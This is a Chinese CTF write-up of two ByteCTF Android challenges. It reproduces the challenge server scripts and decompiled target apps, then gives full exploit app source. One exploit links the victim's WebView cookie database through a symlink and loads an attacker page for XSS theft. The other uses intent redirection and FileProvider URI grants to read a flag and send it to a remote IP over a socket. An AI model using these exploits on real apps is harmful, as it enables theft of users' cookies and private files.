1.easyAndroid技巧刨析
-----------------

**此题是考察Android 漏洞挖掘另一个漏洞点，就是Webview的错误设置导致执行xss代码进行注入，获取cookie文件**

```plain
#!/usr/bin/env python3
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import os
import random
import shlex
import string
import subprocess
import sys
import time
import base64
import requests
import uuid
from hashlib import *
import zipfile
import signal
import traceback

random_hex = lambda x: ''.join([random.choice('0123456789abcdef') for _ in range(x)])
difficulty = 6
ADB_PORT = int(random.random() * 60000 + 5000)
EMULATOR_PORT = ADB_PORT + 1
EXPLOIT_TIME_SECS = 60
APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")
FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")
HOME = "/home/user"
VULER = "com.bytectf.easydroid"
ATTACKER = "com.bytectf.pwneasydroid"

ENV = {}
ENV.update(os.environ)
ENV.update({
    "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT),
    "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT),
    "ANDROID_SDK_ROOT": "/opt/android/sdk",
    "ANDROID_SDK_HOME": HOME,
    "ANDROID_PREFS_ROOT": HOME,
    "ANDROID_EMULATOR_HOME": HOME + "/.android",
    "ANDROID_AVD_HOME": HOME + "/.android/avd",
    "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64",
    "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "")
})

def print_to_user(message):
    print(message)
    sys.stdout.flush()

def download_file(url):
    try:
        download_dir = "download"
        if not os.path.isdir(download_dir):
            os.mkdir(download_dir)
        tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk')
        f = requests.get(url)
        if len(f.content) > 5*1024*1024: # Limit size 5M
            return None
        with open(tmp_file, 'wb') as fp:
            fp.write(f.content)
        return tmp_file
    except:
        return None

def proof_of_work():
    prefix = random_hex(6)
    print_to_user(f'Question: sha256(("{prefix}"+"xxxx").encode()).hexdigest().startswith("{difficulty*"0"}")')
    print_to_user(f'Please enter xxxx to satisfy the above conditions:')
    proof = sys.stdin.readline().strip()
    return sha256((prefix+proof).encode()).hexdigest().startswith(difficulty*"0") == True

def check_apk(path):
    return True

def setup_emulator():
    subprocess.call(
        "avdmanager" +
        " create avd" +
        " --name 'pixel_xl_api_27'" +
        " --abi 'default/x86_64'" +
        " --package 'system-images;android-27;default;x86_64'" +
        " --device pixel_xl" +
        " --force" +
        " > /dev/null 2> /dev/null" + 
        "",
        env=ENV,
        close_fds=True,
        shell=True)

    return subprocess.Popen(
        "emulator" +
        " -avd pixel_xl_api_27" +
        " -no-cache" +
        " -no-snapstorage" +
        " -no-snapshot-save" +
        " -no-snapshot-load" +
        " -no-audio" +
        " -no-window" +
        " -no-snapshot" +
        " -no-boot-anim" +
        " -wipe-data" +
        " -accel on" +
        " -netdelay none" +
        " -no-sim" +
        " -netspeed full" +
        " -delay-adb" +
        " -port {}".format(EMULATOR_PORT) +
        " > /dev/null 2> /dev/null " +
        "",
        env=ENV,
        close_fds=True,
        shell=True,
        preexec_fn=os.setsid)

def adb(args, capture_output=True):
    return subprocess.run(
        "adb {} 2> /dev/null".format(" ".join(args)),
        env=ENV,
        shell=True,
        close_fds=True,
        capture_output=capture_output).stdout

def adb_install(apk):
    adb(["install", apk])

def adb_activity(activity, extras=None, wait=False):
    args = ["shell", "am", "start"]
    if wait:
        args += ["-W"]
    args += ["-n", activity]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    adb(args)

def adb_broadcast(action, receiver, extras=None):
    args = ["shell", "su", "root", "am", "broadcast", "-W", "-a", action, "-n", receiver]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    adb(args)

print_to_user(r"""
 ____                              ____                         __     
/\  _`\                           /\  _`\                __    /\ \    
\ \ \L\_\     __      ____  __  __\ \ \/\ \  _ __   ___ /\_\   \_\ \   
 \ \  _\L   /'__`\   /',__\/\ \/\ \\ \ \ \ \/\`'__\/ __`\/\ \  /'_` \  
  \ \ \L\ \/\ \L\.\_/\__, `\ \ \_\ \\ \ \_\ \ \ \//\ \L\ \ \ \/\ \L\ \ 
   \ \____/\ \__/.\_\/\____/\/`____ \\ \____/\ \_\\ \____/\ \_\ \___,_\
    \/___/  \/__/\/_/\/___/  `/___/> \\/___/  \/_/ \/___/  \/_/\/__,_ /
                                /\___/                                 
                                \/__/                                  
""")

if not proof_of_work():
    print_to_user("Please proof of work again, exit...\n")
    exit(-1)

print_to_user("Please enter your apk url:")
url = sys.stdin.readline().strip()
EXP_FILE = download_file(url)
if not check_apk(EXP_FILE):
    print_to_user("Invalid apk file.\n")
    exit(-1)

print_to_user("Preparing android emulator. This may takes about 2 minutes...\n")
emulator = setup_emulator()
adb(["wait-for-device"])

adb_install(APK_FILE)
adb_activity(f"{VULER}/.MainActivity", wait=True)
with open(FLAG_FILE, "r") as f:
    adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})

time.sleep(3)
adb_install(EXP_FILE)
adb_activity(f"{ATTACKER}/.MainActivity")

print_to_user("Launching! Let your apk fly for a while...\n")
time.sleep(EXPLOIT_TIME_SECS)

try:
    os.killpg(os.getpgid(emulator.pid), signal.SIGTERM)
except:
    traceback.print_exc()
```

跟上题大概的配置要求差不多，只不过这里换了包名和对模拟器的要求，com.bytectf.pwneasydroid我们要在本地的包名设置成这个，如果在本地测试的话，我们要在本地发个广播设置一个flag  
设置flag，跟上题没什么很大的区别：

```plain
adb shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.easydroid/.FlagReceiver -e flag flag{azlyflag}
```

接下来我们就要反编译下apk文件，进行审计  
反编译后，第一步还是要先看下AndroidManifest.xml配置文件

```plain
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.bytectf.easydroid" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="27"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:theme="@style/Theme.Easydroid" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity android:name="com.bytectf.easydroid.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.bytectf.easydroid.TestActivity" android:exported="false"/>
        <receiver android:name="com.bytectf.easydroid.FlagReceiver" android:exported="false">
            <intent-filter>
                <action android:name="com.bytectf.SET_FLAG"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

发现有两个class是不能直接访问的，我们就从MainActivity进行审计

```plain
package com.bytectf.easydroid;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import java.net.URISyntaxException;

public class MainActivity extends AppCompatActivity {
    /* access modifiers changed from: protected */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        if (data == null) {
            data = Uri.parse("http://app.toutiao.com/");
        }
        if (data.getAuthority().contains("toutiao.com") && data.getScheme().equals("http")) {
            WebView webView = new WebView(getApplicationContext());
            webView.setWebViewClient(new WebViewClient() {
                /* class com.bytectf.easydroid.MainActivity.AnonymousClass1 */

                @Override // android.webkit.WebViewClient
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!Uri.parse(url).getScheme().equals("intent")) {
                        return super.shouldOverrideUrlLoading(view, url);
                    }
                    try {
                        MainActivity.this.startActivity(Intent.parseUri(url, 1));
                    } catch (URISyntaxException e) {
                        e.printStackTrace();
                    }
                    return true;
                }
            });
            setContentView(webView);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(data.toString());
        }
    }
}
```

大概就是有个检测，检测url前部分为是否为toutiao.com，然后再进行一个url的读取，然后在开启WebView读取，关键照成漏洞的原因是webView.getSettings().setJavaScriptEnabled(true);，这一行就是将转载过来的url内容当成js代码去执行，如果url的内容设置成我们的xss代码，是不是就能造成一个xss注入了，是的，能进行注入并且读取cookie，如果绕过前面url部分就能直接使用Intent执行我们另一个class文件进行操作  
然后再看下TestActive

```plain
package com.bytectf.easydroid;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.WebView;

public class TestActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String url = getIntent().getStringExtra("url");
        WebView webView = new WebView(getApplicationContext());
        setContentView(webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl(url);
    }
}
```

这个直接就很明显，直接获取intent的url参数进行一个解析成js，这就是在我们exp的setData的一个url参数，盗取cookie文件  
思路：  
1.第一步利用软连接创建一个symlink.html指向Cookies数据库，然后在加载我们自己的网页时注入一个XSS到Cookie中  
2.利用Intent广播一下把data数据放到目标MainActive里，然后用webview进行加载一下我们设置的远程服务器上的js xss代码  
3.然后在我们放的远程代码里放的代码里进行停留，并且接受刚刚创建的软链接，让它导进来并且将cookie文件回显到当前页面上，成功读取flag  
AndroidManifest.xml:

我们在AndroidManifest还是要再次申请一个权限，因为利用的是Intent

MainActive.class:

```plain
package com.bytectf.pwneasydroid;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.Toast;
import java.net.URISyntaxException;
public class MainActivity extends Activity {
    //EditText ed;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //ed = new EditText(this);
        //setContentView(ed);
        //launch("file://" + symlink());
        symlink();   //创建软链接
        Intent i = new Intent();
        i.setClassName("com.bytectf.easydroid","com.bytectf.easydroid.MainActivity");
        i.setData(Uri.parse("http://toutiao.com.azly.top/index.html"));
        new Handler().postDelayed(() -> startActivity(i),5000);
    }
    private void launch(String url) {
        Uri uri = Uri.parse("http://106.14.254.135#toutiao.com/");
        Intent i = new Intent();
        i.setClassName("com.bytectf.easydroid","com.bytectf.easydroid.TestActivity");
        i.putExtra("url",url);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        String url_str = i.toUri(Intent.URI_INTENT_SCHEME);
        //ed.setText(url_str);
    }
    private String symlink() {
        try {
            String root = getApplicationInfo().dataDir;
            String symlink = root + "/symlink.";
            String cookies = "/data/data/com.byhtmltectf.easydroid/app_webview/Cookies";
            Runtime.getRuntime().exec("rm " + symlink).waitFor();
            Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
            Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
            return symlink;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```

MainActive思路：第一步就是根据思路来进行创建软链接，然后根据Intent进行传参到Webview，加载我们远程服务器的index.html的js代码进行一个xss注入接受软链接symxml.html，因为symxml是链接到我们的cookie数据库里，接收到以后就能就能获取flag显示当前页面上了

**总结1：此题学到了Android 漏洞挖掘的一个关于WebView的一种利用方式**

2.BabyAndroid技巧刨析
-----------------

**Android pwn它的需要一些App开发知识和四大组件，在bytectf有关于Android pwn的几道题，这里简单记录下**

1.我们拿到题目压缩包，压缩包里有server的py文件，我们先审计一下这个py文件  
server.py：

```plain
#!/usr/bin/env python3
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import os
import random
import shlex
import string
import subprocess
import sys
import time
import base64
import requests
import uuid
from hashlib import *
import zipfile
import signal
import traceback

random_hex = lambda x: ''.join([random.choice('0123456789abcdef') for _ in range(x)])
difficulty = 6
ADB_PORT = int(random.random() * 60000 + 5000)
EMULATOR_PORT = ADB_PORT + 1
EXPLOIT_TIME_SECS = 30
APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")
FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")
HOME = "/home/user"
VULER = "com.bytectf.babydroid"   #目标是这个包名
ATTACKER = "com.bytectf.pwnbabydroid"  #我们要按照这个文件包名来写个exp app

ENV = {}
ENV.update(os.environ)
ENV.update({
    "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT),
    "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT),
    "ANDROID_SDK_ROOT": "/opt/android/sdk",
    "ANDROID_SDK_HOME": HOME,
    "ANDROID_PREFS_ROOT": HOME,
    "ANDROID_EMULATOR_HOME": HOME + "/.android",
    "ANDROID_AVD_HOME": HOME + "/.android/avd",
    "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64",
    "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "")
})

def print_to_user(message):
    print(message)
    sys.stdout.flush()

def download_file(url):
    try:
        download_dir = "download"
        if not os.path.isdir(download_dir):
            os.mkdir(download_dir)
        tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk')
        f = requests.get(url)
        if len(f.content) > 5*1024*1024: # Limit size 5M
            return None
        with open(tmp_file, 'wb') as fp:
            fp.write(f.content)
        return tmp_file
    except:
        return None

def proof_of_work():
    prefix = random_hex(6)
    print_to_user(f'Question: sha256(("{prefix}"+"xxxx").encode()).hexdigest().startswith("{difficulty*"0"}")')
    print_to_user(f'Please enter xxxx to satisfy the above conditions:')
    proof = sys.stdin.readline().strip()
    return sha256((prefix+proof).encode()).hexdigest().startswith(difficulty*"0") == True

def check_apk(path):
    return True

def setup_emulator():
    subprocess.call(
        "avdmanager" +
        " create avd" +
        " --name 'pixel_xl_api_30'" +
        " --abi 'google_apis/x86_64'" +
        " --package 'system-images;android-30;google_apis;x86_64'" +
        " --device pixel_xl" +
        " --force" +
        " > /dev/null 2> /dev/null" + 
        "",
        env=ENV,
        close_fds=True,
        shell=True)

    return subprocess.Popen(
        "emulator" +
        " -avd pixel_xl_api_30" +
        " -no-cache" +
        " -no-snapstorage" +
        " -no-snapshot-save" +
        " -no-snapshot-load" +
        " -no-audio" +
        " -no-window" +
        " -no-snapshot" +
        " -no-boot-anim" +
        " -wipe-data" +
        " -accel on" +
        " -netdelay none" +
        " -no-sim" +
        " -netspeed full" +
        " -delay-adb" +
        " -port {}".format(EMULATOR_PORT) +
        " > /dev/null 2> /dev/null " +
        "",
        env=ENV,
        close_fds=True,
        shell=True,
        preexec_fn=os.setsid)

def adb(args, capture_output=True):
    return subprocess.run(
        "adb {} 2> /dev/null".format(" ".join(args)),
        env=ENV,
        shell=True,
        close_fds=True,
        capture_output=capture_output).stdout

def adb_install(apk):
    adb(["install", apk])

def adb_activity(activity, extras=None, wait=False):
    args = ["shell", "am", "start"]
    if wait:
        args += ["-W"]
    args += ["-n", activity]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    adb(args)

def adb_broadcast(action, receiver, extras=None):
    args = ["shell", "su", "root", "am", "broadcast", "-W", "-a", action, "-n", receiver]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    adb(args)

print_to_user(r"""
 ____              __               ____                         __     
/\  _`\           /\ \             /\  _`\                __    /\ \    
\ \ \L\ \     __  \ \ \____  __  __\ \ \/\ \  _ __   ___ /\_\   \_\ \   
 \ \  _ <'  /'__`\ \ \ '__`\/\ \/\ \\ \ \ \ \/\`'__\/ __`\/\ \  /'_` \  
  \ \ \L\ \/\ \L\.\_\ \ \L\ \ \ \_\ \\ \ \_\ \ \ \//\ \L\ \ \ \/\ \L\ \ 
   \ \____/\ \__/.\_\\ \_,__/\/`____ \\ \____/\ \_\\ \____/\ \_\ \___,_\
    \/___/  \/__/\/_/ \/___/  `/___/> \\/___/  \/_/ \/___/  \/_/\/__,_ /
                                 /\___/                                 
                                 \/__/                                  
""")

if not proof_of_work():
    print_to_user("Please proof of work again, exit...\n")
    exit(-1)

print_to_user("Please enter your apk url:")
url = sys.stdin.readline().strip()
EXP_FILE = download_file(url)
if not check_apk(EXP_FILE):
    print_to_user("Invalid apk file.\n")
    exit(-1)

print_to_user("Preparing android emulator. This may takes about 2 minutes...\n")
emulator = setup_emulator()
adb(["wait-for-device"])

adb_install(APK_FILE)
adb_activity(f"{VULER}/.MainActivity", wait=True)
with open(FLAG_FILE, "r") as f:
    adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})

time.sleep(3)
adb_install(EXP_FILE)
adb_activity(f"{ATTACKER}/.MainActivity")

print_to_user("Launching! Let your apk fly for a while...\n")
time.sleep(EXPLOIT_TIME_SECS)

try:
    os.killpg(os.getpgid(emulator.pid), signal.SIGTERM)
except:
    traceback.print_exc()
```

通过审计上面的py文件我们要在之前准备几个东西，一个就是模拟器system-images;android-30;google\_apis;x86\_64，设置这个模拟器，AVD manage里设置一下就可以  
然后我们把给的apk文件用jadx-gui去解析下，第一步先看AndroidManifest.xml

```plain
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.bytectf.babydroid" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>
    <application android:theme="@style/Theme.Babydroid" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity android:name="com.bytectf.babydroid.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.bytectf.babydroid.Vulnerable">
            <intent-filter>
                <action android:name="com.bytectf.TEST"/>   #主要是这里
            </intent-filter>
        </activity>
        <receiver android:name="com.bytectf.babydroid.FlagReceiver" android:exported="false">
            <intent-filter>
                <action android:name="com.bytectf.SET_FLAG"/>
            </intent-filter>
        </receiver>
        <provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="androidx.core.content.FileProvider" android:grantUriPermissions="true">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
        </provider>
    </application>
</manifest>
```

我们发现在intent里创建了很多过滤器，所以我们先看下com.bytectf.babydroid.Vulnerable这个包

```plain
package com.bytectf.babydroid;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class Vulnerable extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startActivity((Intent) getIntent().getParcelableExtra("intent"));
    }
}
```

这个应该就是攻击的class，这里利用了一个组件Intent，看下Intent基础：

1. 显式Intent  
    构造方法接收两个参数：( context提供启动活动的上下文，class指定想启动的目标活动 )  
    Intent intent = new Intent(FirstActivity.this, SecondActivity.class);  
    startActivity(intent);
2. 隐式Intent  
    指定action和category等信息。action只能指定一个，category可指定多个。  
    Intent intent = new Intent("com.example.activitytest.ACTION\_START");  
    intent.addCategory("com.example.activitytest.MY\_CATEGORY");  
    startActivity(intent);  
    3.隐式Intent启动其他程序  
    // 浏览器  
    Intent intent = new Intent(Intent.ACTION\_VIEW);  
    intent.setData(Uri.parse("<http://www.baidu.com>"));  
    startActivity(intent);  
    //拨号  
    Intent intent = new Intent(Intent.ACTION\_DIAL);  
    intent.setData(Uro.parse("tel:10086"));  
    startActivity(intent);  
    4.向下一个活动传递数据  
    传入：调用 putExtra()，接收两个参数分别为键值。  
    取出：首先调用 getIntent() 获取Intent，再根据传递的数据类型，调用 getStringExtra()、getIntExtra() 等方法。  
    //传入  
    String data = "Hello SecondActivity";  
    Intent intent = new Intent(FirstActivity.this, SecondActivity.class);  
    Intent.putExtra("extra\_data",data);  
    startActivity(intent);  
    //取出  
    Intent intent= getIntent();  
    String data = intent.getStringExtra("extra\_data");  
    Log.d("SecondActivity", data);
3. 返回数据给上一个活动  
    启动活动：使用 startActivityForResult() ，它接收两个参数 ( Intent, 请求码 )。  
    返回数据：new出一个Intent putExtra() 放入数据，调用 setResult(RESULT\_OK, intent) ，最后销毁当前活动。  
    获取数据：重写回调的 onActivityResult() 方法，检查requestCode和resultCode，调用 data.getStringExtra() 取出数据。  
    // 获取数据  
    \[@Override \]()  
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
    switch (requestCode) {  
    case 1:  
    if (resultCode == RESULT\_OK) {  
    String returnedData = data.getStringExtra("data\_return");  
    Log.d("FirstActivity", returnedData);  
    }  
    break;  
    default:  
    }  
    }

学过基础后，就可以直接写exp了，因为我们可以直接跳转到我们nc的class里面进而远程带出flag  
1.利用Android studio 创建项目，空白的项目即可  
2.包名要跟它规定的一样，也就是pwnbabydroid  
3.在AndroidManifest.xml添加要申请的权限 这是我们要进行申请权限（由于目标是30版本，我们这里要多加个  
android:usesCleartextTraffic="true"，因为高版本是禁止使用明文流量的）  
4.我们利用传参的方式来写主要exp，通过exp的传参，跳转到目标的攻击类里（Vulnclass），然后通过目标的攻击类跳转到我们创建的FlagHunter里  
5.FlagHunter里写的主要是，我们进行获取远程的一个flag，并反弹到我们远程服务器上进而获取flag  
6.由于是在本地创建的环境所以我们本地目标app里是没有flag文件的，这里我们要用adb自己去导入一个flag文件  
在py文件里有个这几行代码，是用来写flag的准确位置，由于是在本地复现，我们跟据它写的地址，我们利用adb发个广播  
adb\_install(APK\_FILE)  
adb\_activity(f"{VULER}/.MainActivity", wait=True)  
with open(FLAG\_FILE, "r") as f:  
adb\_broadcast(f"com.bytectf.SET\_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})  
adb shell su root am broadcast -W -a com.bytectf.SET\_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag flag{azly,good hack}  
这里导入的时候，我们要在模拟器里要打开目标app才能准确导入  
7.这些都准备好后就可以运行了，在远程服务器获取flag  
还有一点是要注意的是，因为我们除了一个主要的class，另外创建了一个flagHunter class文件，这时候我们要在AndroidManifest进行添加这个就可以了  
以上就是这个题的思路  
我们直接看exp app code吧，因为更好理解  
MainActivity.class：

```plain
package com.bytectf.pwnbabydroid;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent extra = new Intent();
        extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.bytectf.pwnbabydroid.FlagHunter"); extra.setData(Uri.parse("content://androidx.core.content.FileProvider/"));
        Intent intent = new Intent();
        intent.setClassName("com.bytectf.babydroid", "com.bytectf.babydroid.Vulnerable");
        intent.putExtra("intent", extra);
        intent.setAction("com.bytectf.TEST"); 
        startActivity(intent);
    }
}
```

重：setAction设置为TEST,是因为我们在目标app上的vulnerable的过滤器就是TEST，不设置的话是无法得到相应的处理的  
FlagHunter.class:

```plain
package com.bytectf.pwnbabydroid;
import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
public class FlagHunter extends Activity {
    @Override
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            String file = "/root/data/data/com.bytectf.babydroid/files/flag";
            InputStream is = getContentResolver().openInputStream(Uri.parse(getIntent().getDataString() + file));
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            is.close();
            br.close();
            String flag = sb.toString();
            Log.e("FlagHunter", flag);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (true) {
                            Socket sk = new Socket();
                            SocketAddress address = new InetSocketAddress("106.14.254.135", 6666);
                            sk.connect(address, 5000);
                            sk.setTcpNoDelay(true);
                            sk.setKeepAlive(true);
                            OutputStream os = sk.getOutputStream();
                            os.write(flag.getBytes());
                            os.flush();
                            os.close();
                            sk.close();
                            Thread.sleep(1000);
                        }
                    } catch (Exception e) {
                        Log.e("FlagHunter_Err",e.toString());
                    }
                }
            }).start();
            //os.close();
        } catch (Exception e) {
            Log.e("FlagHunter_Err",e.toString());
        }
    }
}
```

AndroidManifest.xml:

```plain
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bytectf.pwnbabydroid">
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        android:usesCleartextTraffic="true"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true" >
        <activity
            android:usesCleartextTraffic="true"
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/title_activity_main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name="com.bytectf.pwnbabydroid.FlagHunter" android:exported="true" />
    </application>
</manifest>
```

自此完整的exp就可以完成了，直接通过Android studio运行即可  
成功反弹到flag

**总结2：这道Android pwn让我 学到好多东西，发现原来Android也可能被出到pwn题上，未来还要多多研究**